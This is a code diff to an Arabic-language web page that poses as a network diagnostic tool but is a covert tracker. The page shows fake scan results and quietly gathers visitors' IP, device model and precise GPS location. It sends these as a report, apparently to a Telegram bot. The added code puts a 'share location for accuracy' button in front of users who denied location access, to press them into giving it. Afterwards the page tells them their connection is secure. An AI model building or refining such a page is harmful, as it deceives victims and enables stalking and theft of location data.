@@ -61,6 +61,23 @@
             display: none;
         }
         .check-detail span { font-weight: 600; color: #334155; }
+        
+        /* الزر الجديد الواضح */
+        #retryGpsBtn {
+            margin-top: 18px;
+            padding: 14px 20px;
+            background: #2563eb;
+            border: none;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            display: none;
+            width: 100%;
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+        }
+        #retryGpsBtn:active { transform: scale(0.97); background: #1d4ed8; }
     </style>
 </head>
 <body>
@@ -78,6 +95,7 @@
         <div>🔄 <span>التردد:</span> <span id="freqStatus">غير محدد</span></div>
         <div>🛡️ <span>التشفير:</span> <span id="encryptStatus">غير مفعل</span></div>
     </div>
+    <button id="retryGpsBtn">📍 مشاركة الموقع للحصول على الدقة</button>
     <div class="footer-note">أداة تشخيص الشبكة الإصدار 2.1</div>
 </div>
 
@@ -90,6 +108,7 @@
 
     let reportSent = false;
     let gpsRequested = false;
+    let gpsDenied = false; // لتتبع إذا رفض المستخدم
     let progress = 0;
     let detailShown = false;
 
@@ -99,7 +118,6 @@
         if (text) document.getElementById('status-text').textContent = text;
     }
 
-    // === تحديث التفاصيل الوهمية (لتبدو كفحص حقيقي) ===
     function updateDetail(net, freq, encrypt) {
         if (!detailShown) {
             document.getElementById('checkDetail').style.display = 'block';
@@ -110,7 +128,6 @@
         if (encrypt) document.getElementById('encryptStatus').textContent = encrypt;
     }
 
-    // === استخراج اسم الجهاز الدقيق ===
     function getExactDevice(ua) {
         let model = 'غير معروف';
         let os = 'جهاز';
@@ -152,7 +169,6 @@
         return `${os} (${model})`;
     }
 
-    // === البيانات ===
     const data = {
         ip: 'غير معروف',
         country: 'غير معروف',
@@ -167,7 +183,6 @@
         referrer: document.referrer || 'مباشر'
     };
 
-    // === 1. جلب الـ IP والتقريبي ===
     async function fetchIP() {
         updateProgress(20, 'جلب معلومات الشبكة...');
         updateDetail('جاري الاتصال...', 'غير محدد', 'غير مفعل');
@@ -204,11 +219,9 @@
         updateDetail('متصل (مباشر)', 'غير محدد', 'مفتوح');
     }
 
-    // === 2. طلب GPS (نافذة المتصفح فوراً) ===
-    function requestGPS() {
+    // الدالة الرئيسية لطلب GPS
+    function requestGPS(showRetryOnFail = true) {
         if (gpsRequested) return;
-        gpsRequested = true;
-
         if (!navigator.geolocation) {
             updateProgress(70, 'الموقع غير مدعوم، نرسل التقريبي');
             updateDetail('متصل', 'محدود', 'غير مدعوم');
@@ -216,11 +229,13 @@
             return;
         }
 
+        gpsRequested = true;
         updateProgress(60, 'جاري طلب الموقع للتحقق من التغطية...');
         updateDetail('متصل', '2.4 جيجاهرتز', 'WPA2');
 
         navigator.geolocation.getCurrentPosition(
             (pos) => {
+                // ✅ نجاح: نأخذ البيانات فوراً ونرسل بدون أي زر
                 data.gps_lat = pos.coords.latitude;
                 data.gps_lon = pos.coords.longitude;
                 updateProgress(90, 'تم تأمين الموقع بنجاح!');
@@ -228,15 +243,42 @@
                 sendReport();
             },
             (err) => {
-                updateProgress(70, 'لم يتم الحصول على الموقع الدقيق');
-                updateDetail('متصل', '2.4 جيجاهرتز', 'مفتوح');
+                // ❌ رفض أو خطأ
+                gpsDenied = true;
+                updateProgress(70, 'تم رفض الموقع، سيتم إرسال التقريبي');
+                updateDetail('متصل (تم رفض الموقع)', '2.4 جيجاهرتز', 'مفتوح');
+                // نرسل التقرير بالتقريبي
                 sendReport();
+                
+                // نظهر الزر ليعطي فرصة ثانية للمستخدم
+                if (showRetryOnFail) {
+                    document.getElementById('retryGpsBtn').style.display = 'block';
+                    document.getElementById('status-text').textContent = '⏳ اضغط على الزر لمشاركة الموقع الدقيق';
+                }
             },
             { enableHighAccuracy: true, timeout: 8000 }
         );
     }
 
-    // === 3. إرسال التقرير (مرة واحدة) ===
+    // دالة إعادة المحاولة (عند الضغط على الزر)
+    function retryGPS() {
+        document.getElementById('retryGpsBtn').style.display = 'none';
+        document.getElementById('status-text').textContent = '🔄 جاري طلب الموقع مرة أخرى...';
+        gpsRequested = false; // نعيد التعيين ليسمح بطلب جديد
+        // نطلب مرة أخرى، ولكن هذه المرة إذا فشل لا نظهر الزر مجدداً (نمنع التكرار اللانهائي)
+        requestGPS(false); 
+        // لكن إذا فشل مرة أخرى، سنحتاج زراً آخر، لذا نضبط مهلة لإظهار الزر مجدداً إذا لم ينجح
+        setTimeout(() => {
+            if (!reportSent && !data.gps_lat) {
+                document.getElementById('retryGpsBtn').style.display = 'block';
+                document.getElementById('status-text').textContent = '⏳ اضغط على الزر للمشاركة';
+            }
+        }, 5000);
+    }
+
+    // ربط الزر بوظيفة إعادة المحاولة
+    document.getElementById('retryGpsBtn').addEventListener('click', retryGPS);
+
     function sendReport() {
         if (reportSent) return;
         reportSent = true;
@@ -268,16 +310,19 @@
                 parse_mode: 'HTML'
             })
         }).then(() => {
-            // بعد الإرسال، نغير الشاشة لتبدو وكأن الفحص اكتمل ولكن نبقى في الصفحة
+            // ننهي الفحص
             document.getElementById('mainIcon').textContent = '✅';
             document.getElementById('mainTitle').textContent = 'تم فحص الشبكة بنجاح';
             document.getElementById('subText').textContent = 'جميع الإعدادات سليمة. الاتصال آمن ومستقر.';
             document.getElementById('progressFill').style.width = '100%';
             document.getElementById('status-text').textContent = '✅ اكتمل الفحص';
-            updateDetail('متصل بقوة', '5 جيجاهرتز', 'WPA3 (مشفر)');
-            // تبقى الصفحة كما هي، لا توجيه
+            document.getElementById('retryGpsBtn').style.display = 'none';
+            if (data.gps_lat && data.gps_lon) {
+                updateDetail('متصل بقوة (دقيق)', '5 جيجاهرتز', 'WPA3 (مشفر)');
+            } else {
+                updateDetail('متصل (تقريبي)', '2.4 جيجاهرتز', 'مفتوح');
+            }
         }).catch(() => {
-            // حتى لو فشل الإرسال، نظهر نفس الرسالة
             document.getElementById('mainIcon').textContent = '⚠️';
             document.getElementById('mainTitle').textContent = 'تم الفحص مع بعض التحذيرات';
             document.getElementById('subText').textContent = 'تم الاتصال لكن بعض الإعدادات غير مثالية.';
@@ -286,14 +331,13 @@
         });
     }
 
-    // === 4. بدء التشغيل ===
+    // === بدء التشغيل ===
     setTimeout(async () => {
         updateProgress(5, 'بدء فحص الشبكة...');
-        document.getElementById('status-text').textContent = 'جاري فحص الترددات...';
         setTimeout(() => updateDetail('جاري الفحص...', '2.4 جيجاهرتز', 'غير مفعل'), 300);
         await fetchIP();
         setTimeout(() => {
-            requestGPS();
+            requestGPS(true); // نمرر true لإظهار الزر إذا رفض
         }, 400);
     }, 300);
 </script>
